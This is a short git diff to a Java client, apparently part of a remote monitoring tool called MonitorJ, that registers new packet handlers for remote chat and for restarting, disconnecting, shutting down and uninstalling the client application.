@@ -1,6 +1,6 @@
 package me.jershdervis.monitorj.stub.client;
 
-import me.jershdervis.monitorj.stub.client.tasks.PingTask;
+import me.jershdervis.monitorj.stub.client.tasks.*;
 import me.jershdervis.monitorj.stub.eventapi.EventManager;
 import me.jershdervis.monitorj.stub.eventapi.EventTarget;
 import me.jershdervis.monitorj.stub.eventapi.events.EventReceivePacket;
@@ -19,6 +19,14 @@ public class PacketTaskManager {
         EventManager.register(this);
 
         this.addPacketTask(new PingTask());
+        this.addPacketTask(new RemoteChatStartTask());
+        this.addPacketTask(new RemoteChatStopTask());
+        this.addPacketTask(new RemoteChatMessage());
+
+        this.addPacketTask(new RestartClientApplicationTask());
+        this.addPacketTask(new DisconnectClientTask());
+        this.addPacketTask(new ShutdownClientApplicationTask());
+        this.addPacketTask(new UninstallClientApplicationTask());
     }
 
     @EventTarget
